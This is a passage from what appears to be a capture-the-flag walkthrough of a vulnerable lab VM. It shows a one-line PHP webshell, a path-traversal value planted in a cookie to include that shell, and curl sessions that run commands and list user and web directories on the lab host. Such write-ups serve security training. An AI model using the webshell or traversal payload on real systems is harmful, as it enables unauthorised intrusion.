</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">cmd</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;]);</span> <span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure></p>

<p><img class="left" src="/downloads/Hell1/3.png"></p>

<p>Now I have already got a webshell and can run system command which is ready to poke around on the server file system.</p>

<p>In order to make the life easier, I use <code>curl</code> instead of burp proxy to interactive with target server.</p>

<p>First to request <code>check.php</code>, we can see that cookies <code>PHPSESSID</code> and <code>failcount</code> have been set.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>root@kali:~/hell# curl -v -L <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://10.10.10.146/super_secret_login_path_muhahaha/check.php&quot;</span><span class="nt">&gt;</span>http://10.10.10.146/super_secret_login_path_muhahaha/check.php<span class="nt">&lt;/a&gt;</span> -c cookies -b cookies
</span><span class='line'>* About to connect() to 10.10.10.146 port 80 (#0)
</span><span class='line'>*   Trying 10.10.10.146<span class="ni">&amp;hellip;</span>
</span><span class='line'>* connected
</span><span class='line'>* Connected to 10.10.10.146 (10.10.10.146) port 80 (#0)<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;blockquote&gt;&lt;p&gt;</span>GET /super_secret_login_path_muhahaha/check.php HTTP/1.1
</span><span class='line'>User-Agent: curl/7.26.0
</span><span class='line'>Host: 10.10.10.146
</span><span class='line'>Accept: <span class="nt">&lt;em&gt;</span>/<span class="nt">&lt;/em&gt;&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;ul&gt;</span>
</span><span class='line'><span class="nt">&lt;li&gt;</span>additional stuff not fine transfer.c:1037: 0 0<span class="nt">&lt;/li&gt;</span>
</span><span class='line'><span class="nt">&lt;li&gt;</span>HTTP 1.1 or later with persistent connection, pipelining supported
</span><span class='line'><span class="ni">&amp;lt;</span> HTTP/1.1 302 Found
</span><span class='line'><span class="ni">&amp;lt;</span> Date: Wed, 15 Jul 2015 00:06:37 GMT
</span><span class='line'><span class="ni">&amp;lt;</span> Server: Apache/2.2.22 (Debian)
</span><span class='line'><span class="ni">&amp;lt;</span> X-Powered-By: PHP/5.4.4-14+deb7u11<span class="nt">&lt;/li&gt;</span>
</span><span class='line'><span class="nt">&lt;li&gt;</span>Added cookie PHPSESSID=<span class="ni">&amp;ldquo;</span>cb11eurq57no9kbu8k09pvt0d5<span class="ni">&amp;rdquo;</span> for domain 10.10.10.146, path /, expire 0
</span><span class='line'><span class="ni">&amp;lt;</span> Set-Cookie: PHPSESSID=cb11eurq57no9kbu8k09pvt0d5; path=/
</span><span class='line'><span class="ni">&amp;lt;</span> Expires: Thu, 19 Nov 1981 08:52:00 GMT
</span><span class='line'><span class="ni">&amp;lt;</span> Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
</span><span class='line'><span class="ni">&amp;lt;</span> Pragma: no-cache
</span><span class='line'><span class="ni">&amp;lt;</span> Location: personal.php<span class="nt">&lt;/li&gt;</span>
</span><span class='line'><span class="nt">&lt;li&gt;</span>Added cookie failcount=<span class="ni">&amp;ldquo;</span>1<span class="ni">&amp;rdquo;</span> for domain 10.10.10.146, path /super_secret_login_path_muhahaha/, expire 0
</span><span class='line'><span class="ni">&amp;lt;</span> Set-Cookie: failcount=1
</span><span class='line'><span class="ni">&amp;lt;</span> Vary: Accept-Encoding
</span><span class='line'><span class="ni">&amp;lt;</span> Content-Length: 2
</span><span class='line'><span class="ni">&amp;lt;</span> Content-Type: text/html
</span><span class='line'><span class="ni">&amp;lt;</span><span class="nt">&lt;/li&gt;</span>
</span><span class='line'><span class="nt">&lt;li&gt;</span>Ignoring the response-body<span class="nt">&lt;/li&gt;</span>
</span><span class='line'><span class="nt">&lt;li&gt;</span>Connection #0 to host 10.10.10.146 left intact<span class="nt">&lt;/li&gt;</span>
</span><span class='line'><span class="nt">&lt;li&gt;</span>Issue another request to this URL: <span class="ni">&amp;lsquo;</span><span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://10.10.10.146/super_secret_login_path_muhahaha/personal.php&quot;</span><span class="nt">&gt;</span>http://10.10.10.146/super_secret_login_path_muhahaha/personal.php<span class="nt">&lt;/a&gt;</span><span class="ni">&amp;rsquo;</span><span class="nt">&lt;/li&gt;</span>
</span><span class='line'><span class="nt">&lt;li&gt;</span>Re-using existing connection! (#0) with host (nil)<span class="nt">&lt;/li&gt;</span>
</span><span class='line'><span class="nt">&lt;li&gt;</span>Connected to (nil) (10.10.10.146) port 80 (#0)
</span><span class='line'>GET /super_secret_login_path_muhahaha/personal.php HTTP/1.1
</span><span class='line'>User-Agent: curl/7.26.0
</span><span class='line'>Host: 10.10.10.146
</span><span class='line'>Accept: <span class="nt">&lt;em&gt;</span>/<span class="nt">&lt;/em&gt;</span>
</span><span class='line'>Cookie: failcount=1; PHPSESSID=cb11eurq57no9kbu8k09pvt0d5<span class="nt">&lt;/li&gt;</span>
</span><span class='line'><span class="nt">&lt;/ul&gt;</span>
</span><span class='line'><span class="nt">&lt;/blockquote&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;</span>root@kali:~/hell# cat cookies<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;h1&gt;</span>Netscape HTTP Cookie File<span class="nt">&lt;/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;h1&gt;&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://curl.haxx.se/rfc/cookie_spec.html&quot;</span><span class="nt">&gt;</span>http://curl.haxx.se/rfc/cookie_spec.html<span class="nt">&lt;/a&gt;&lt;/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;h1&gt;</span>This file was generated by libcurl! Edit at your own risk.<span class="nt">&lt;/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;</span>10.10.10.146    FALSE   /   FALSE   0   PHPSESSID   cb11eurq57no9kbu8k09pvt0d5
</span><span class='line'>10.10.10.146    FALSE   /super_secret_login_path_muhahaha/  FALSE   0   failcount   1
</span></code></pre></td></tr></table></div></figure></p>

<p>New cookie &ldquo;intruder&rdquo; has been set after running the same command 3 times.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/hell# cat cookies&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>Netscape HTTP Cookie File&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;h1>&lt;a href="http://curl.haxx.se/rfc/cookie_spec.html">http://curl.haxx.se/rfc/cookie_spec.html&lt;/a>&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;h1>This file was generated by libcurl! Edit at your own risk.&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>10.10.10.146    FALSE   /   FALSE   0   PHPSESSID   cb11eurq57no9kbu8k09pvt0d5
</span><span class='line'>10.10.10.146    FALSE   /super_secret_login_path_muhahaha/  FALSE   0   failcount   3
</span><span class='line'>10.10.10.146    FALSE   /super_secret_login_path_muhahaha/  FALSE   0   intruder    1</span></code></pre></td></tr></table></div></figure></p>

<p>Then I change the value of cookie <code>intruder</code> to include our webshell file: <code>/tmp/note.txt</code>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>root@kali:~/hell# cat cookies<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;h1&gt;</span>Netscape HTTP Cookie File<span class="nt">&lt;/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;h1&gt;&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://curl.haxx.se/rfc/cookie_spec.html&quot;</span><span class="nt">&gt;</span>http://curl.haxx.se/rfc/cookie_spec.html<span class="nt">&lt;/a&gt;&lt;/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;h1&gt;</span>This file was generated by libcurl! Edit at your own risk.<span class="nt">&lt;/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;</span>10.10.10.146    FALSE   /   FALSE   0   PHPSESSID   cb11eurq57no9kbu8k09pvt0d5
</span><span class='line'>10.10.10.146    FALSE   /super_secret_login_path_muhahaha/  FALSE   0   failcount   3
</span><span class='line'>10.10.10.146    FALSE   /super_secret_login_path_muhahaha/  FALSE   0   intruder    <span class="ni">&amp;hellip;</span>.//<span class="ni">&amp;hellip;</span>.//<span class="ni">&amp;hellip;</span>.//<span class="ni">&amp;hellip;</span>.//<span class="ni">&amp;hellip;</span>.//<span class="ni">&amp;hellip;</span>.//tmp//note.txt
</span><span class='line'>root@kali:~/hell# curl -v <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://10.10.10.146/super_secret_login_path_muhahaha/panel.php?cmd=id&quot;</span><span class="nt">&gt;</span>http://10.10.10.146/super_secret_login_path_muhahaha/panel.php?cmd=id<span class="nt">&lt;/a&gt;</span> -c cookies -b cookies
</span><span class='line'>* About to connect() to 10.10.10.146 port 80 (#0)
</span><span class='line'>*   Trying 10.10.10.146<span class="ni">&amp;hellip;</span>
</span><span class='line'>* connected
</span><span class='line'>* Connected to 10.10.10.146 (10.10.10.146) port 80 (#0)<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;blockquote&gt;&lt;p&gt;</span>GET /super_secret_login_path_muhahaha/panel.php?cmd=id HTTP/1.1
</span><span class='line'>User-Agent: curl/7.26.0
</span><span class='line'>Host: 10.10.10.146
</span><span class='line'>Accept: <span class="nt">&lt;em&gt;</span>/<span class="nt">&lt;/em&gt;</span>
</span><span class='line'>Cookie: intruder=<span class="ni">&amp;hellip;</span>.//<span class="ni">&amp;hellip;</span>.//<span class="ni">&amp;hellip;</span>.//<span class="ni">&amp;hellip;</span>.//<span class="ni">&amp;hellip;</span>.//<span class="ni">&amp;hellip;</span>.//tmp//note.txt; failcount=3; PHPSESSID=cb11eurq57no9kbu8k09pvt0d5<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;ul&gt;</span>
</span><span class='line'><span class="nt">&lt;li&gt;</span>additional stuff not fine transfer.c:1037: 0 0<span class="nt">&lt;/li&gt;</span>
</span><span class='line'><span class="nt">&lt;li&gt;</span>HTTP 1.1 or later with persistent connection, pipelining supported
</span><span class='line'><span class="ni">&amp;lt;</span> HTTP/1.1 302 Found
</span><span class='line'><span class="ni">&amp;lt;</span> Date: Wed, 15 Jul 2015 00:16:47 GMT
</span><span class='line'><span class="ni">&amp;lt;</span> Server: Apache/2.2.22 (Debian)
</span><span class='line'><span class="ni">&amp;lt;</span> X-Powered-By: PHP/5.4.4-14+deb7u11
</span><span class='line'><span class="ni">&amp;lt;</span> Expires: Thu, 19 Nov 1981 08:52:00 GMT
</span><span class='line'><span class="ni">&amp;lt;</span> Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
</span><span class='line'><span class="ni">&amp;lt;</span> Pragma: no-cache
</span><span class='line'><span class="ni">&amp;lt;</span> Location: index.php
</span><span class='line'><span class="ni">&amp;lt;</span> Vary: Accept-Encoding
</span><span class='line'><span class="ni">&amp;lt;</span> Content-Length: 620
</span><span class='line'><span class="ni">&amp;lt;</span> Content-Type: text/html
</span><span class='line'><span class="ni">&amp;lt;</span><span class="nt">&lt;/li&gt;</span>
</span><span class='line'><span class="nt">&lt;/ul&gt;</span>
</span><span class='line'><span class="nt">&lt;/blockquote&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;&lt;HTML&gt;</span>
</span><span class='line'><span class="nt">&lt;CENTRE&gt;&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;H2&gt;</span> Folders <span class="nt">&lt;/H2&gt;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;&lt;TABLE</span> <span class="na">style=</span><span class="s">&quot;width:700px&quot;</span> <span class="na">align=</span><span class="s">&quot;center&quot;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;TR&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;server.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;mail.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;users.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;personal.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;notes.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'><span class="nt">&lt;/TR&gt;</span>
</span><span class='line'><span class="nt">&lt;TR&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Server Status<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Mail Status<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Auth Users<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Personal Folder<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Notes<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'><span class="nt">&lt;/TR&gt;</span>
</span><span class='line'><span class="nt">&lt;/CENTRE&gt;</span>
</span><span class='line'>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span><span class='line'><span class="nt">&lt;/HTML&gt;</span>
</span><span class='line'>* Connection #0 to host 10.10.10.146 left intact
</span><span class='line'>* Closing connection #0
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>root@kali:~/hell# curl <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://10.10.10.146/super_secret_login_path_muhahaha/panel.php?cmd=ls+-l+/home&quot;</span><span class="nt">&gt;</span>http://10.10.10.146/super_secret_login_path_muhahaha/panel.php?cmd=ls+-l+/home<span class="nt">&lt;/a&gt;</span> -c cookies -b cookies<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;&lt;HTML&gt;</span>
</span><span class='line'><span class="nt">&lt;CENTRE&gt;</span>
</span><span class='line'><span class="nt">&lt;H2&gt;</span> Folders <span class="nt">&lt;/H2&gt;</span>
</span><span class='line'><span class="nt">&lt;TABLE</span> <span class="na">style=</span><span class="s">&quot;width:700px&quot;</span> <span class="na">align=</span><span class="s">&quot;center&quot;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;TR&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;server.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;mail.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;users.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;personal.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;notes.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'><span class="nt">&lt;/TR&gt;</span>
</span><span class='line'><span class="nt">&lt;TR&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Server Status<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Mail Status<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Auth Users<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Personal Folder<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Notes<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'><span class="nt">&lt;/TR&gt;</span>
</span><span class='line'><span class="nt">&lt;/CENTRE&gt;</span>
</span><span class='line'>total 20
</span><span class='line'>drwx<span class="ni">&amp;mdash;&amp;mdash;</span> 3 bazza       bazza       4096 Jul 13 01:43 bazza
</span><span class='line'>drwx<span class="ni">&amp;ndash;</span>x<span class="ni">&amp;ndash;</span>x 3 george      george      4096 Jul 12 07:27 george
</span><span class='line'>drwx<span class="ni">&amp;mdash;&amp;mdash;</span> 5 jack        jack        4096 Jul 12 05:28 jack
</span><span class='line'>drwx<span class="ni">&amp;mdash;&amp;mdash;</span> 2 milk_4_life milk_4_life 4096 Jul 12 06:59 milk_4_life
</span><span class='line'>drwx<span class="ni">&amp;mdash;&amp;mdash;</span> 2 oj          oj          4096 Jul 14 01:49 oj
</span><span class='line'><span class="nt">&lt;/HTML&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Here we can see there are 5 users under folder <code>/home</code>: <strong>bazza</strong>, <strong>george</strong>, <strong>jack</strong>, <strong>milk_4_life</strong> and <strong>oj</strong></p>

<h2>Moving to <strong>jack</strong></h2>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>root@kali:~/hell# curl <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;http://10.10.10.146/super_secret_login_path_muhahaha/panel.php?cmd=ls+-l+/var/www/&quot;</span><span class="nt">&gt;</span>http://10.10.10.146/super_secret_login_path_muhahaha/panel.php?cmd=ls+-l+/var/www/<span class="nt">&lt;/a&gt;</span> -c cookies -b cookies<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;&lt;HTML&gt;</span>
</span><span class='line'><span class="nt">&lt;CENTRE&gt;</span>
</span><span class='line'><span class="nt">&lt;H2&gt;</span> Folders <span class="nt">&lt;/H2&gt;</span>
</span><span class='line'><span class="nt">&lt;TABLE</span> <span class="na">style=</span><span class="s">&quot;width:700px&quot;</span> <span class="na">align=</span><span class="s">&quot;center&quot;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;TR&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;server.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;mail.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;users.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;personal.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">&quot;notes.php&quot;</span><span class="nt">&gt;&lt;IMG</span> <span class="na">SRC=</span><span class="s">&#39;folder.png&#39;</span><span class="nt">&gt;&lt;/A&gt;&lt;/TD&gt;</span>
</span><span class='line'><span class="nt">&lt;/TR&gt;</span>
</span><span class='line'><span class="nt">&lt;TR&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Server Status<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Mail Status<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Auth Users<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Personal Folder<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'>    <span class="nt">&lt;TD&gt;&lt;H4&gt;</span>Notes<span class="nt">&lt;/H4&gt;&lt;/TD&gt;</span>
</span><span class='line'><span class="nt">&lt;/TR&gt;</span>
</span><span class='line'><span class="nt">&lt;/CENTRE&gt;</span>
</span><span class='line'>total 112
</span><span class='line'>-rw-r<span class="ni">&amp;ndash;</span>r<span class="ni">&amp;ndash;</span> 1 www-data www-data 87841 Jun 17  2014 comic.png
</span><span class='line'>-rwxr<span class="ni">&amp;ndash;</span>r<span class="ni">&amp;ndash;</span> 1 www-data www-data  7846 Jun 20  2014 echoserver.bak
</span><span class='line'>-rw-r<span class="ni">&amp;ndash;</span>r<span class="ni">&amp;ndash;</span> 1 www-data www-data   466 Jun 20  2014 index.html
</span><span class='line'>drwxr-xr-x 2 www-data www-data  4096 Jun 20  2014 personal
</span><span class='line'>-rw-r<span class="ni">&amp;ndash;</span>r<span class="ni">&amp;ndash;</span> 1 www-data www-data    80 Jun 17  2014 robots.txt
